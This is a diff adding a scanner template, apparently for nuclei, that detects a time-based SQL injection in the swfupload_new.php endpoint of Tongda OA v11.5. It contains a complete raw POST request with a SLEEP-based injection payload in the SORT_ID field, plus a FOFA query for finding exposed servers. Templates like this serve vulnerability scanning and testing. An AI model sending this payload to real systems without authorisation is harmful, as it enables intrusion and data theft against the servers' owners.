@@ -1,0 +1,47 @@
+id: TongDa-4
+
+info:
+  name: 通达OA v11.5 swfupload_new.php SQL注入漏洞
+  author: attempt
+  severity: high
+  description: |
+    通达OA v11.5 swfupload_new.php 文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器敏感信息
+  reference:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v11.5-swfupload_new.php-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: TongDa,OA,SQL注入漏洞
+request:
+  - raw:
+      - |
+        POST /general/file_folder/swfupload_new.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+        Accept-Encoding: gzip
+        
+        
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+        
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+        
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+        
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+        
+        -@`'`  AND (SELECT 3397 FROM (SELECT(SLEEP(3)))jCdN)
+        ------------GFioQpMK0vv2--
+    
+    matchers:
+      - type: duration
+        part: duration
+        duration: 3
